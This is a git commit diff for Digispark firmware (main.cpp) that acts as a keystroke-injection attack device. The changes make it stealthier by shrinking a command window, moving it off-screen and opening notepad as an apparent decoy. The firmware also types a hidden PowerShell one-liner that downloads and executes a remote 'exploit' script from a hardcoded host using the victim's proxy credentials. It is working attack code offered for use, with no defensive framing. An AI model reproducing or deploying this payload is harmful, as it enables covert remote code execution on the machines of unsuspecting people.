0340aa5dabb0afc9732a3677ba856b0bd6a4e8b8
Xre0uS <hello@xre0us.io>
2025-03-23 17:15:19 +0800

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -6,8 +6,20 @@ void setup() {
 
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(60);
-  DigiKeyboard.println("cmd");
-  DigiKeyboard.delay(600);
+  DigiKeyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=30 lines=6");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(60);
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_SPACE);
+  delay(60);
+  DigiKeyboard.print("m");
+  DigiKeyboard.sendKeyPress(KEY_LEFT_ARROW);
+  delay(3000);
+  DigiKeyboard.sendKeyPress(0);
+  delay(60);
+  DigiKeyboard.println("notepad");
+  delay(60);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  
   DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.10:8080/exploit');");
   }
 
